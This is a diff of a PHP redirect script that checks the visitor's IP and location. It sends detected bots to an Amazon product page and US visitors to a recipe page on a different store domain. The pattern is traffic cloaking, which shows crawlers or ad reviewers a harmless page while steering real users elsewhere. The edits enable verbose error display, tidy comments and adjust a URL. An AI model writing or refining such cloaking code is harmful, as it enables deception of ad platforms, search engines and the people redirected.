@@ -1,4 +1,9 @@
 <?php
+// Enable error reporting for debugging
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
 // Function to get user's IP address
 function getUserIP() {
     if (isset($_SERVER['HTTP_CLIENT_IP'])) {
@@ -10,11 +15,10 @@ function getUserIP() {
     }
 }
 
-// Function to get location from IP (You can use a service like IPinfo, GeoIP2, etc.)
+// Function to get location from IP (Replace with actual IP-to-location service)
 function getLocationFromIP($ip) {
-    // Example: Mock function to simulate location
-    // Replace with actual IP-to-location service
-    return 'US';  // Mock return value, replace with actual implementation
+    // Mock function - replace with actual implementation
+    return 'US';  // Mock return value for testing
 }
 
 // Get user's IP and location
@@ -36,7 +40,7 @@ if ($isBot) {
     header('Location: https://www.amazon.com/Simple-Joys-Carters-Short-Sleeve-Bodysuit/dp/B07GY1RRZF');
     exit();
 } else if ($userLocation === 'US') {
-    header('Location: https://roastandrelish.store/honey-chicken-recipe-french');
+    header('Location: https://roastandrelish.store/honey-chicken-recipe-french/');
     exit();
 } else {
     // Default redirection or content
